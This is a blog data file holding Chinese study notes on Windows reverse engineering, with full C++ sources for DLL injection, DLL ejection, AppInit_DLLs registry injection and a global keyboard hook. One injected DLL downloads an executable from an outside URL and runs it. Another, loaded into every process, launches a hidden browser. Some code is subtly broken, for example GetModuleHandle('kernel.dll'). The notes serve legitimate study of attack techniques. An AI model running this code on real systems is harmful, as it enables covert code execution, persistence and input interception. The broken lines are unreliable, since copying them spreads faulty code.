{"meta":{"title":"This is Title","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"about","date":"2023-10-27T15:04:19.000Z","updated":"2023-10-27T17:10:23.471Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"Welcome to my blog! Have a nice day!"},{"title":"categories","date":"2023-10-27T14:56:34.000Z","updated":"2023-10-27T15:00:41.794Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"DLL注入-第24章DLL卸载","slug":"DLL注入-第24章DLL卸载","date":"2024-03-08T12:59:19.000Z","updated":"2024-03-11T00:21:01.514Z","comments":true,"path":"2024/03/08/DLL注入-第24章DLL卸载/","link":"","permalink":"http://example.com/2024/03/08/DLL%E6%B3%A8%E5%85%A5-%E7%AC%AC24%E7%AB%A0DLL%E5%8D%B8%E8%BD%BD/","excerpt":"","text":"第24章 DLL卸载DLL卸载（DLL Ejection）是将强制插入进程的DLL弹出的一种技术，其基本工作原理与使用CreateRemoteThread API进行DLL注入的原理类似 24.1 DLL卸载的工作原理前面我们学习过使用CreateRemoteThread() API进行DLL注入的工作原理，概括如下： 驱使目标进程调用LoadLibrary() API 同样，DLL卸载工作原理也非常简单： 趋势目标进程调用FreeLibrary() API 也就是说，将FreeLibrary() API的地址传递给CreateRemoteThread()的lpStartAddress参数，并把要卸载的DLL的句柄传递给lpParameter参数 每个Windows内核对象（Kernel Object）都拥有一个引用计数（Reference Count），代表对象被使用的次数。调用10次LoadLibrary(“a.dll”)，a.dll的引用计数就变为10，卸载a.dll时同样血药调用10次FreeLibrary()（每调用一次LoadLibrary()，引用计数会加1，而每调用一次FreeLibrary()，引用计数就会减1）因此，卸载DLL时要充分考虑好引用计数这个因素 24.2 实现DLL卸载EjectDll.exeEjectDll.exe是用来从目标进程卸载指定的DLL文件（已注入目标进程） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161// EjectDll.exe#include &quot;windows.h&quot;#include &quot;tlhelp32.h&quot;#include &quot;tchar.h&quot;#define DEF_PROC_NAME (L&quot;notepad.exe&quot;)#define DEF_DLL_NAME (L&quot;myhack.dll&quot;)DWORD FindProcessID(LPCTSTR szProcessName)&#123; DWORD dwPID = 0xFFFFFFFF; HANDLE hSnapShot = INVALID_HANDLE_VALUE; PROCESSENTRY32 pe; // Get the snapshot of the system pe.dwSize = sizeof( PROCESSENTRY32 ); hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL ); // find process Process32First(hSnapShot, &amp;pe); do &#123; if(!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile)) &#123; dwPID = pe.th32ProcessID; break; &#125; &#125; while(Process32Next(hSnapShot, &amp;pe)); CloseHandle(hSnapShot); return dwPID;&#125;BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) &#123; TOKEN_PRIVILEGES tp; HANDLE hToken; LUID luid; if( !OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken) ) &#123; _tprintf(L&quot;OpenProcessToken error: %u\\n&quot;, GetLastError()); return FALSE; &#125; if( !LookupPrivilegeValue(NULL, // lookup privilege on local system lpszPrivilege, // privilege to lookup &amp;luid) ) // receives LUID of privilege &#123; _tprintf(L&quot;LookupPrivilegeValue error: %u\\n&quot;, GetLastError() ); return FALSE; &#125; tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; if( bEnablePrivilege ) tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; else tp.Privileges[0].Attributes = 0; // Enable the privilege or disable all privileges. if( !AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) &#123; _tprintf(L&quot;AdjustTokenPrivileges error: %u\\n&quot;, GetLastError() ); return FALSE; &#125; if( GetLastError() == ERROR_NOT_ALL_ASSIGNED ) &#123; _tprintf(L&quot;The token does not have the specified privilege. \\n&quot;); return FALSE; &#125; return TRUE;&#125;BOOL EjectDll(DWORD dwPID, LPCTSTR szDllName)&#123; BOOL bMore = FALSE, bFound = FALSE; HANDLE hSnapshot, hProcess, hThread; HMODULE hModule = NULL; MODULEENTRY32 me = &#123; sizeof(me) &#125;; LPTHREAD_START_ROUTINE pThreadProc; // dwPID = notepad进程ID // 使用TH32CS_SNAPMODULE参数，获取加载到notepad进程的DLL名称 hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID); bMore = Module32First(hSnapshot, &amp;me); for( ; bMore ; bMore = Module32Next(hSnapshot, &amp;me) ) &#123; if( !_tcsicmp((LPCTSTR)me.szModule, szDllName) || !_tcsicmp((LPCTSTR)me.szExePath, szDllName) ) &#123; bFound = TRUE; break; &#125; &#125; if( !bFound ) &#123; CloseHandle(hSnapshot); return FALSE; &#125; if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) ) &#123; _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\\n&quot;, dwPID, GetLastError()); return FALSE; &#125; hModule = GetModuleHandle(L&quot;kernel32.dll&quot;); pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, &quot;FreeLibrary&quot;); hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, me.modBaseAddr, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); CloseHandle(hSnapshot); return TRUE;&#125;int _tmain(int argc, TCHAR* argv[])&#123; DWORD dwPID = 0xFFFFFFFF; // find process dwPID = FindProcessID(DEF_PROC_NAME); if( dwPID == 0xFFFFFFFF ) &#123; _tprintf(L&quot;There is no &lt;%s&gt; process!\\n&quot;, DEF_PROC_NAME); return 1; &#125; _tprintf(L&quot;PID of \\&quot;%s\\&quot; is %d\\n&quot;, DEF_PROC_NAME, dwPID); // change privilege if( !SetPrivilege(SE_DEBUG_NAME, TRUE) ) return 1; // eject dll if( EjectDll(dwPID, DEF_DLL_NAME) ) _tprintf(L&quot;EjectDll(%d, \\&quot;%s\\&quot;) success!!!\\n&quot;, dwPID, DEF_DLL_NAME); else _tprintf(L&quot;EjectDll(%d, \\&quot;%s\\&quot;) failed!!!\\n&quot;, dwPID, DEF_DLL_NAME); return 0;&#125; 上述代码中的EjectDll()函数就是用来卸载DLL的，下面仔细分析一下EjectDll()函数 获取进程中加载的DLL信息 hSnapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID); 使用CreateToolhelp32Snapshot() API可以获取加载到进程的模块（DLL）信息。将获取的hSnapshot句柄传递给Module32First()&#x2F;Module32Next()函数后，即可设置与MODULEENTRY32结构体相关的模块信息，下面是MODULEENTRY32结构体的定义： 12345678910111213typedef struct tagMODULEENTRY32&#123; DWORD dwSize; DWORD th32ModuleID; // This module DWORD th32ProcessID; // owning process DWORD GlblcntUsage; // Global usage count on the module DWORD ProccntUsage; // Module usage count in th32ProcessID&#x27;s context BYTE *modBaseAddr; // Base address of module in th32ProcessID&#x27;s context DWORD modBaseSize; // Size in bytes of module starting at modBaseAddr HMODULE hModule; // The hModule of this module in th32ProcessID&#x27;s context char szModule[MAX_MODULE_NAME32 + 1]; char szExePath[MAX_PATH];&#125;MODULEENTRY32; szModule成员便是DLL的名称，modBaseAddr成员表示相应DLL被加载的地址（进程虚拟内存），在EjectDll()函数的for循环中比较szModule与希望卸载的DLL文件名称，能够准确查找到相应模块的信息 获取目标进程的句柄 hProcess &#x3D; openProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); 该语句使用进程ID来获取目标进程的进程句柄（下面用获得的进程句柄调用CreateRemoteThread() API） 获取FreeLibrary() API地址 hModule &#x3D; GetModuleHandle(L”kernel32.dll”); pThreadProc &#x3D; (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, “FreeLibrary”); 若要驱使notepad进程自己调用FreeLibrary() API，需要先得到FreeLibrary()的地址。然而上述代码获取的不是加载到notepad.exe进程中的Kernel32!FreeLibrary地址，而是加载到EjectDll.exe进程中的Kernel32!FreeLibrary地址。如果理解了前面学过的有关DLL注入的内容，就能猜出FreeLibrary地址在所有进程中都是相同的 在目标进程中运行线程 hThread &#x3D; CreateRemoteThread(hProcess, NULL, 0, pThreadProc, me.modBaseAddr, 0, NULL); pThreadProc参数是FreeLibrary() API的地址，me.modBaseAddr参数是要卸载的DLL的加载地址。将线程函数指定为FreeLibrary函数，并把DLL加载地址传递给线程参数，这样就在目标进程中成功调用了FreeLibrary() API（CreateRemoteThread() API原意是在外部进程调用执行线程函数，只不过这里的线程函数换成了FreeLibrary()函数） 123BOOL WINAPI FreeLibrary( HMODULE hLibModule); ThreadProc函数与FreeLibrary函数都只有一个参数，所以就有了上面的方法 后记 使用FreeLibrary()卸载DLL的方法仅适用于卸载自己强制注入（使用CreateRemoteThread()注入）的DLL文件。PE文件直接导入的DLL文件是无法在进程运行过程中卸载的","categories":[{"name":"逆向工程核心原理","slug":"逆向工程核心原理","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"name":"DLL注入","slug":"逆向工程核心原理/DLL注入","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/DLL%E6%B3%A8%E5%85%A5/"}],"tags":[]},{"title":"DLL注入-第23章DLL注入","slug":"DLL注入-第23章DLL注入","date":"2024-02-24T07:26:29.000Z","updated":"2024-03-11T00:21:08.162Z","comments":true,"path":"2024/02/24/DLL注入-第23章DLL注入/","link":"","permalink":"http://example.com/2024/02/24/DLL%E6%B3%A8%E5%85%A5-%E7%AC%AC23%E7%AB%A0DLL%E6%B3%A8%E5%85%A5/","excerpt":"","text":"第23章 DLL注入 12345678910111213141516BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)&#123; switch (dwReason) &#123; case DLL_PROCESS_ATTACH: //添加想执行的代码 break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; DLL注入实现方式向某个进程注入DLL时主要使用以下三种方式： 创建远程线程（CreateRemoteThread() API） 使用注册表（AppInit_DLLs 值） 消息钩取（SetWindowsHookEx() API） CreateRemoteThread() APIMyHack.dll在DllMain()函数中可以看到，该dll被加载（DLL_PROCESS_ATTACH）时，先输出一个调试字符串（”myhack.dll Injection!!!”），然后创建线程调用函数（ThreadProc）。在ThreadProc()函数中通过调用urlmon!URLDownloadToFile() API来下载指定网站的index.html文件。前面提到过，向进程注入dll后就会调用执行该dll的DllMain()函数。所以当myhack.dll注入指定进程后，最终回调用执行URLDownloadToFile() API 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071// Myhack.cpp#include &quot;pch.h&quot;#include &quot;windows.h&quot;#include &quot;tchar.h&quot;#include &quot;atlstr.h&quot;#include &lt;iostream&gt;#include &lt;shlobj.h&gt;#pragma comment(lib, &quot;urlmon.lib&quot;)#pragma comment(lib, &quot;shell32.lib&quot;)using namespace std;#define DownloadURL L&quot;https://ys-api.mihoyo.com/event/download_porter/link/ys_cn/official/pc_default&quot;#define FileName L&quot;\\\\yuanshen_setup.exe&quot;HMODULE g_hMod = NULL;DWORD WINAPI ThreadProc(LPVOID lParam)&#123; TCHAR DesktopPath[MAX_PATH]; TCHAR* szFileName = new TCHAR[lstrlen(DownloadURL) + lstrlen(FileName) + 1]; szFileName[0] = _T(&#x27;\\0&#x27;); //获取当前用户的桌面路径 if (SHGetSpecialFolderPath(NULL, DesktopPath, CSIDL_DESKTOPDIRECTORY, FALSE)) &#123; lstrcat(szFileName, DownloadURL); lstrcat(szFileName, FileName); &#125; else &#123; cerr &lt;&lt; &quot;真是可恶啊！&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; HRESULT hResult = URLDownloadToFileW( NULL, DownloadURL, szFileName, 0, NULL ); if (hResult == S_OK) &#123; char OpenFile[128] = &#123; 0 &#125;; wcstombs(OpenFile, szFileName, 128); system(OpenFile); &#125; else &#123; MessageBox(NULL, _T(&quot;真是可恶啊！&quot;), _T(&quot;TITLE&quot;), MB_OK); &#125; return 0;&#125;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123; HANDLE hThread = NULL; g_hMod = (HMODULE)hinstDLL; switch (fdwReason) &#123; case DLL_PROCESS_ATTACH: OutputDebugString(L&quot;myhack.dll Injection!!!&quot;); hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); CloseHandle(hThread); break; &#125; return TRUE;&#125; InjectDll.exemain() 函数的主要功能是检查输入程序的参数，然后调用InjectDll()函数。InjectDll() 函数是用来实施dll注入的核心函数，其功能是命令目标进程（notepad.exe）自行调用LoadLibrary(“myhack.dll”) API 获取目标进程句柄 hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); 调用OpenProcess() API，借助程序运行时以参数形式传递过来的dwPID值，获取目标进程的句柄（PROCESS_ALL_ACCESS权限）得到PROCESS_ALL_ACCESS权限后，就可以使用获取的句柄（hProcess）控制对应进程 将要注入的dll路径写入目标进程内存 pRemoteBuf &#x3D; VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE); 需要把即将加载的dll文件的路径（字符串）告知目标进程。因为任何内存空间都无法进行写入操作，所以先使用VirtualAllocEx() API在目标进程的内存空间中分配一块缓冲区，且指定该缓冲区的大小为dll文件路径字符串的长度即可（含Terminating NULL） VirtualAllocEx() 函数的返回值pRemoteBuf为分配所得缓冲区的地址。该地址并不是程序（InjectDll.exe）自身进程的内存地址，而是 hProcess 句柄所指目标进程的内存地址 WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllName, dwBufSize, NULL); 使用WriteProcessMemory() API将dll路径字符串写入分配所得缓冲区（pRemoteBuf）地址。WriteProcessMemory() API所写的内存空间也是hProcess句柄所指的目标进程的内存空间。这样，要注入的dll文件的路径就被写入目标进程的内存空间 获取LoadLibraryW() API地址 hMod &#x3D; GetModuleHandle(“kernel32.dll”); pThreadProc &#x3D; (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, “LoadLibraryW”); 调用LoadLibrary() API前要先获取其地址（LoadLibraryW() 是LoadLibrary() 的Unicode字符串版本） 最重要的是理解好以上代码的含义，我们的目标明明是获取加载到目标进程的kernel32.dll的LoadLibraryW() API的起始地址，但上面的代码却用来获取加载到InjectDll.exe进程的kernel32.dll的LoadLibraryW() API的起始地址。如果加载到目标进程中的kernel32.dll的地址与加载到InjectDll.exe进程的kernel32.dll的地址相同，那么上面的代码就错了，执行时回发生内存引用错误 其实在Windows系统中，kernel32.dll在每个进程中的加载地址都是相同的（文章最后有更进一步的介绍） 在目标进程中运行远程线程（Remote Thread） hThread &#x3D; CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL); 一切准备就绪后，最后向目标进程发送一个命令，让其调用LoadLibraryW() API函数加载指定的dll文件即可，遗憾的是Windows并未直接提供这一命令的API。但是我们可以使用CreateRemoteThread() 这个API（在dll注入时几乎总会用到） CreateRemoteThread() API用来在目标进程中执行创建出的线程，其函数原型： 123456789HANDLE WINAPI CreateRemoteThread( __in HANDLE hProcess, // 目标进程句柄 __in LPSECURITY_ATTRIBUTES lpThreadAttributes, __in SIZE_T dwStackSize, __in LPTHREAD_START_ROUTINE lpStartAddress, //线程函数地址 __in LPVOID lpParameter, //线程参数地址 __in DWORD dwCreationFlags, __out LPDWORD lpThreadId); 除了第一个参数hProcess外，其他参数与CreateThread()函数完全一样。hProcess参数是要执行线程的目标进程（或称”远程进程“、”宿主进程“）的句柄。lpStartAddress与lpParameter参数分别给出线程函数地址与线程参数地址。需要注意的是，这两个地址都应该在目标进程虚拟内存空间中，这样目标进程才能认识它们 初次接触dll注入可能会很懵。本来想向其它进程注入dll文件，这里为什么突然出现线程运行函数呢？自诩观察线程函数ThreadProc()与LoadLibrary() API，可以从中得到一些启示 12345678//ThreadProc与LoadLibrary函数原型比较DWORD WINAPI ThreadProc( __in LPVOID lpParameter);HMODULE WINAPI LoadLibrary( __in LPCTSTR lpFileName); 两函数都有一个4字节的参数，并返回一个4字节的值。也就是说，两者的形态结果完全一样，调用CreateRemoteThread()时，只要将LoadLibrary()函数的地址传递给第四个参数lpStartAddress，把要注入的dll的路径字符串地址传递给第五个参数lpParameter即可（必须时目标进程的虚拟内存空间中的地址） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667//InjectDll.cpp#include &quot;windows.h&quot;#include &quot;tchar.h&quot;BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)&#123; HANDLE hProcess = NULL, hThread = NULL; HMODULE hMod = NULL; LPVOID pRemoteBuf = NULL; DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR); LPTHREAD_START_ROUTINE pThreadProc; // dwPID获取目标进程句柄 if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID))) &#123; _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\\n&quot;, dwPID, GetLastError()); return FALSE; &#125; //在目标进程内存中分配szDllName大小的内存 pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE); //将dll路径写入分配的内存 WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL); //获取 LoadLibraryW() API地址 hMod = GetModuleHandle(L&quot;kernel.dll&quot;); pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, &quot;LoadLibraryW&quot;); //在进程中运行线程 hThread = CreateRemoteThread( hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL ); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return TRUE;&#125;int _tmain(int argc, TCHAR* argv[])&#123; if (argc != 3) &#123; _tprintf(L&quot;USAGE : %s pid dll_path\\n&quot;, argv[0]); return 1; &#125; //inject dll if (InjectDll((DWORD)_tstol(argv[1]), argv[2])) &#123; _tprintf(L&quot;InjectDll(\\&quot;%s\\&quot;) success!!!\\n&quot;, argv[2]); &#125; else &#123; _tprintf(L&quot;InjectDll(\\&quot;%s\\&quot;) failed!!!\\n&quot;, argv[2]); &#125; return 0;&#125; 后记 根据OS类型、语言、版本不同，kernel32.dll加载的地址也不同。并且 Vista&#x2F;7中应用了新的ASLR功能，每次启动时，系统DLL加载的地址都会改变。但是在系统运行期间它都会被映射( Mapping)到每个进程的相同地址。Windows操作系统中，DLL首次进入内存称为“加载”(Loading )，以后其他进程需要使用相同DLL时不必再次加载，只要将加载过的DLL代码与资源映射一下即可，这种映射技术有利于提高内存的使用效率。 有时会因为系统用户权限、安全设置等导致dll注入失败 练习示例注意操作顺序 运行notepad.exe 先运行notepad.exe，再运行Process Explorer获取notepad.exe进程的PID 可以看到PID为22648 运行DebugView 当示例中的dll文件被成功注入notepad.exe进程时，就会输出调试字符串，此时使用DebugView即可查看 myhack.dll注入 确认dll注入成功 AppInit_DLLs进行DLL注入的第二种方法是使用注册表。Windows操作系统的注册表中默认提供了AppInit_DLLs与LoadAppInit_DLLs两个注册表项 在注册表编辑器中，将要注入的DLL的路径字符串写入AppInit_DLLs项目，然后把LoadAppInit_DLLs的项目值设置为1。重启后，指定DLL会注入所有运行进程。该方法操作非常简单，但功能相当强大 上述方法的工作原理是，User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，若有值，则调用LoadLibrary() API加载用户DLL。所以严格的讲，相应DLL并不会被加载到所有进程，而只是加载至加载user32.dll的进程 myhack2.dllmyhack2.dll的源代码（myhack2.cpp）非常简单，若当前加载自己的进程为“notepad.exe”，则以隐藏模式运行IE，连接指定网站。这样就可以根据不同目的执行多种任务了 123456789101112131415161718192021222324252627282930313233343536373839404142//myhack2.cpp#include &quot;windows.h&quot;#include &quot;tchar.h&quot;#define DEF_CMD L&quot;c:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe&quot;#define DEF_ADDR L&quot;http://www.naver.com&quot;#define DEF_DST_PROC L&quot;notepad.exe&quot;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123; TCHAR szCmd[MAX_PATH] = &#123;0,&#125;; TCHAR szPath[MAX_PATH] = &#123;0,&#125;; TCHAR *p = NULL; STARTUPINFO si = &#123;0,&#125;; PROCESS_INFORMATION pi = &#123;0,&#125;; si.cb = sizeof(STARTUPINFO); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; switch(fdwReason) &#123; case DLL_PROCESS_ATTACH: if(!GetModuleFileName(NULL, szPath, MAX_PATH)) break; if(!(p = _tcsrchr(szPath, &#x27;\\\\&#x27;))) break; if(_tcsicmp(p+1, DEF_DST_PROC)) break; wsprintf(szCmd, L&quot;%s %s&quot;, DEF_CMD, DEF_ADDR); if(!CreateProcess(NULL, (LPTSTR)(LPCTSTR)szCmd, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &amp;si, &amp;pi)) break; if(pi.hProcess != NULL) CloseHandle(pi.hProcess); break; &#125; return TRUE;&#125; 练习示例注意操作顺序 复制文件 首先将要注入的DLL文件（myhack2.cpp）复制到合适位置 修改注册表项 运行注册表编辑器regedit.exe，进入一下路径 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows 编辑修改AppInit_DLLs表项的值，输入myhack2.dll的完整路径 然后修改LoadAppInit_DLLs注册表项的值为1 重启系统 注册表项修改完毕后，重启系统，使修改生效。系统重启完成后，使用Process Explorer查看myhack2.dll是否被注入所有（加载user32.dll的）进程 AppInit_DLLs注册表键非常强大，通过它几乎可以向所有进程注入DLL文件。若被注入的DLL出现问题，则有可能导致Windows无法正常启动，所以修改该AppInit_DLLs前务必彻查 SetWindowsHookEx()注入DLL的第三个方法就是消息钩取，即用SetWindowsHookEx() API安装好消息钩子，然后由OS讲指定DLL（含有钩子过程）强制注入相应（带窗口的）进程","categories":[{"name":"逆向工程核心原理","slug":"逆向工程核心原理","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"name":"DLL注入","slug":"逆向工程核心原理/DLL注入","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/DLL%E6%B3%A8%E5%85%A5/"}],"tags":[]},{"title":"DLL注入-第21章Windows消息钩取","slug":"DLL注入-第21章Windows消息钩取","date":"2024-02-22T15:14:22.000Z","updated":"2024-03-11T00:21:13.373Z","comments":true,"path":"2024/02/22/DLL注入-第21章Windows消息钩取/","link":"","permalink":"http://example.com/2024/02/22/DLL%E6%B3%A8%E5%85%A5-%E7%AC%AC21%E7%AB%A0Windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96/","excerpt":"","text":"第21章 Windows消息钩取21.1 钩子Hook，不仅可以查看来往于“OS-应用程序-用户”之间的全部信息，也可以操控它们。具体方法有很多，其中最基本的是“消息钩子”（Message Hook） 21.2 消息钩子Windows操作系统向用户提供GUI（图像用户界面），它以事件驱动方式工作。在操作系统中借助键盘、鼠标，选择菜单、按钮，以及移动鼠标、改变窗口大小与位置等都是事件。发生这样的事件时，OS会把实现定义好的消息发送给相应的应用程序，应用程序分析收到的信息后执行相应动作。也就是说，敲击键盘的时候，消息会从OS移动到应用程序。所谓的“消息钩子”就是偷看这些信息 下面以键盘消息为例说明： 发生键盘输入事件时，WM_KEYDOWN消息被添加到[OS message queue] OS判断哪个应用程序中发生了事件，然后从[OS message queue]取出消息，添加到相应应用程序的[application message queue]中 应用程序（如notepad.exe）监视自身的[application message queue]，发现新添加的WM_KEYDOWN消息后，调用相应的事件处理程序处理 如下图所示，OS消息队列与应用程序消息队列之间存在一条“钩链”（Hook Chain），设置好键盘消息钩子后，处于“钩链”中的键盘消息钩子会比应用程序先看到相应信息。在键盘消息钩子函数的内部，除了可以看到消息之外，还可以修改消息本身，而且还可以对消息实施拦截，阻止消息传递 可以同时设置多个相同的键盘消息钩子，按照设置顺序依次调用这些钩子，它们组成的链条称为“钩链” 像这样的消息钩子功能是Windows操作系统提供的基本功能，其中最具代表性的是MS Visual Studio中提供的SPY++ 21.3 SetWindowsHookEx()使用 SetWindowsHookEx() API 可以轻松实现消息钩子，SetWindowsHookEx() API 的定义如下 123456HHOOK SetWindowsHookEx( int idHook, // hook type HOOKPROC lpfn, // hook procedure HINSTAANCE hMod, // hook procedure 所属的dll句柄(Handle) DWORD dwThreadId // 想要挂载的线程id); 钩子过程（hook procedure）是由操作系统调用的回调函数。安装消息钩子时，钩子过程需要存在于某个DLL内部，且该DLL的示例句柄（instance handle）即是hMod 如果dwThreadId参数被设置为0，则安装的钩子为“全局钩子”（Global Hook），它会影响到运行中的（以及以后要运行的）所有进程 像这样，使用SetWindowsHookEx()设置好钩子后，在某个进程中生成指定消息时，操作系统会将相关的DLL文件强制注入（injection）相应进程，然后调用注册的钩子过程 21.4 键盘消息钩取练习先看图加深对钩取的理解 KeyHook.dll文件是一个含有钩子过程（KeyboardProc）的DLL文件，HookMain.exe是最先加载Keyboard.dll并安装键盘钩子的程序。HookMain.exe加载Keyboard.dll后使用SetWindowsHookEx()安装键盘钩子（KeyboardProc） 若其它进程（如explore.exe，iexplore.exe，notepad.exe）中发生键盘输入事件，OS就会强制将KeyHook.dll加载到相应进程的内存，然后调用KeyboardProc函数 这里需要注意的一点是，OS会将Keyboard.dll强制加载到发生键盘输入事件的所有进程。也就是说，消息钩取技术，常常被用作一种DLL注入技术 21.4.1 源代码HookMain.cpp源代码非常的简单，先加载KeyHook.dll文件，然后调用HookStart()函数开始钩取，用户输入“q”时，调用HookStop()函数终止钩取 12345678910111213141516171819202122232425262728293031323334353637383940//HookMain.cpp#include &quot;stdio.h&quot;#include &quot;conio.h&quot;#include &quot;windows.h&quot;#define DEF_DLL_NAME &quot;KeyHook.dll&quot;#define DEF_HOOKSTART &quot;HookStart&quot;#define DEF_HOOKSTOP &quot;HookStop&quot;typedef void(*PFN_HOOKSTART)();typedef void(*PFN_HOOKSTOP)();void main()&#123; HMODULE hDll = NULL; PFN_HOOKSTART HookStart = NULL; PFN_HOOKSTOP HookStop = NULL; char ch = 0; //加载KeyHook.dll hDll = LoadLibraryA(DEF_DLL_NAME); //获取导出函数地址 HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART); HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP); //开始钩取 HookStart(); //等待知道用户输入&quot;q&quot; printf(&quot;press &#x27;q&#x27; to quit!\\n&quot;); while(_getch() != &#x27;q&#x27;); //终止钩取 HookStop(); //卸载KeyHook.dll FreeLibrary(hDll);&#125; KeyHook.cppDLL代码也非常的简单，调用导出函数HookStart()时，SetWindowsHookEx()函数就会将KeyBoardProc()添加到键盘钩链 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667//KeyHook.cpp#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#define DEF_PROCESS_NAME &quot;notepad.exe&quot;HINSTANCE g_hInstance = NULL;HHOOK g_hHook = NULL;HWND g_hWnd = NULL;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)&#123; switch(dwReason) &#123; case DLL_PROCESS_ATTACH: g_hInstance = hinstDLL; break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)&#123; char szPath[MAX_PATH] = &#123;0,&#125;; char *p = NULL; if(nCode == 0) &#123; //bit 31: 0 = key press, 1 = key release if(!(lParam &amp; 0x80000000)) //释放键盘按键时 &#123; GetModuleFileNameA(NULL, szPath, MAX_PATH); p = strrchr(szPath, &#x27;\\\\&#x27;); //比较当前进程名称， 若为notepad.exe，则消息不会传递给应用程序（或下一个钩子） if(!_stricmp(p+1, DEF_PROCESS_NAME)) &#123; return 1; &#125; &#125; &#125; //若非notepad.exe，则调用CallNextHookEx()函数，将消息传递给应用程序（或下一个钩子） return CallNextHookEx(g_hHook, nCode, wParam, lParam);&#125;#ifdef __cplusplusextern &quot;C&quot; &#123;#endif__declspec(dllexport) void HookStart()&#123; g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);&#125;__declspec(dllexport) void HookStop()&#123; if(g_hHook) &#123; UnhookWindowsHookEx(g_hHook); g_hHook = NULL; &#125;&#125;#ifdef __cplusplus&#125;#endif 安装好键盘钩子后，无论哪个进程，只要发生键盘输入事件，OS就会强制将KeyHook.dll注入相应进程。加载了KeyHook.dll的进程中，发生键盘事件时会首先调用执行KeyHook.KeyboardProc() KeyboardProc()函数中发生键盘输入事件时，就会比较当前进程的名称与”notepad.exe”字符串，如果相同，就会返回1，终止KeyboardProc()函数，这意味着截获且删除信息。这样，键盘消息就不会传递到notepad.exe程序的消息队列（因notepad.exe未能接收到任何键盘消息，故无法输出） 21.4.2 示例用Process Explorer查看没运行HookMain.exe时的notepad.exe进程 